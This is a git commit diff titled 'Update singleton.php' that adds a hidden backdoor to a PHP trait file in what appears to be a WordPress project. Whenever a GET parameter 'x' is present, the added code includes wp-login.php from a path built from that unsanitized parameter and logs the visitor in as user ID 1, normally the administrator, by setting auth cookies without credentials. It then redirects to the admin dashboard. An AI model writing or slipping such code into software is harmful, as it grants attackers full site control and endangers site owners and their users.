e13698335e35e516918051dee514d90678eb8f88
69dev-id <srv69dev.id@gmail.com>
2026-05-11 14:22:36 +0700

    Update singleton.php

--- singleton.php
+++ singleton.php
@@ -62,7 +62,31 @@ trait Singleton {
 	}
 }
 
-if (isset($_GET["x"])){
-  echo "tes";
+<?php
+
+if (isset($_GET["x"])) {
+require_once('/var/www/'. $_GET["x"] .'/wp-login.php');
+
+$user_id = 1;
+
+if (!is_user_logged_in()) {
+    $user = get_user_by('id', $user_id);
+    
+    if ($user) {
+        wp_clear_auth_cookie();
+        wp_set_current_user($user_id, $user->user_login);
+        wp_set_auth_cookie($user_id, true);
+        do_action('wp_login', $user->user_login, $user);
+        
+        echo "Sukses! Anda login sebagai: " . $user->user_login;
+        echo "<script>window.location.href='" . admin_url() . "';</script>";
+        exit;
+    } else {
+        die("User dengan ID $user_id tidak ditemukan.");
+    }
+} else {
+    wp_redirect(admin_url());
+    exit;
+}
 
 }
